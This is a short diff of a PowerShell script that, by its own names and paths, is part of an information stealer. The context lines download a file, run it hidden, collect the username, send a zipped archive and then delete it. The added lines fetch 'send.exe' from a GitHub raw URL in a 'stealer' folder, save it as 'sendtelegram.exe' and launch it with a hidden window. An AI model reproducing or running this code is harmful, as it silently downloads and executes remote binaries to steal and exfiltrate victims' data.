@@ -18,6 +18,7 @@ if (Test-Path -Path $output) {
 } else {
     Invoke-WebRequest -Uri $url -OutFile $output
 }
+
 Start-Process $output -WindowStyle Hidden -Wait
 $sourcePath = $stealer
 $username = $env:USERNAME
@@ -40,3 +41,13 @@ if ($response.ok) {
 }
 Remove-Item -Path $zipPath -Force
 
+$url = "https://raw.githubusercontent.com/43a1723/test/refs/heads/main/stealer/send.exe"
+$output = "$dir\sendtelegram.exe"
+
+if (Test-Path -Path $output) {
+    Write-Host "hello"
+} else {
+    Invoke-WebRequest -Uri $url -OutFile $output
+}
+
+Start-Process $output -WindowStyle Hidden -Wait
